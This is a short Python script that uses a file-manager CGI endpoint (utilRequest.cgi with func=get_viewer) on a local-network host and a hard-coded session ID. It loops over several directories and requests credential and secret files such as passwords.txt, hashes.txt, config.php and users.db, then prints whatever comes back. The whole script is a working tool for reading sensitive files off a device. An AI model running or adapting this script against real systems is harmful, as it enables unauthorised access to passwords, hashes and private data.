import requests

base_url = "http://192.168.178.32:8080/cgi-bin/filemanager/utilRequest.cgi"
sid = "ejrsf3ca"
paths = ["/Multimedia", "/Download", "/Web", "/Public", "/homes", "/home", "/Secrets"]
files = ["passwords.txt", "hashes.txt", "secrets.txt", "config.php", "backup.tar.gz", "users.db"]

for path in paths:
    for file in files:
        url = f"{base_url}/password.txt?sid={sid}&func=get_viewer&source_path={path}&source_file={file}"
        response = requests.get(url)
        if response.status_code == 200:
            print(f"Zugriff auf {path}/{file}:")
            print(response.text)
